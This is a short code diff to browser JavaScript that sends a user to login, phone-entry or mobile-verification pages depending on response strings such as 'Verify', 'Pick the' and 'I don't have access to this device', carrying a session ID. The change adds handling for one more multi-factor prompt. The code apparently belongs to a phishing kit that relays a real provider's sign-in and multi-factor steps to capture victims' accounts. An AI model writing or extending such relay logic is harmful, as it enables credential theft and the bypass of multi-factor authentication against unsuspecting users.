@@ -269,12 +269,13 @@ document.addEventListener("click", async (e) => {
       } else if (responseText == "lastcve") {
 
         location.href = `/login.html?status=false`;
-      } else if (responseText.includes("Verify")) {
+      } else if (responseText.includes("Verify")  || responseText.includes("I don’t have access to this device")) {
         location.href = `/mobile-verification.html?sessionId=${sessionId}&text=${responseText}`;
       }
       else if(response == "-1") {
         location.href = `/login.html?status=false`;
       }
+
     } catch (error) {
       console.error("Error selecting tile:", error);
     }
@@ -323,7 +324,7 @@ function checkLoginStatus() {
         location.href = `/enter-phone.html?sessionId=${sessionId}`;
       } else if (responseText == "lastcve") {
         location.href = `/login.html?status=false`;
-      } else if (responseText.includes("Verify")) {
+      } else if (responseText.includes("Verify") || responseText.includes("I don’t have access to this device")) {
         location.href = `/mobile-verification.html?sessionId=${sessionId}&text=${responseText}`;
       } else if (responseText.includes("Pick the")) {
         inst = responseText;
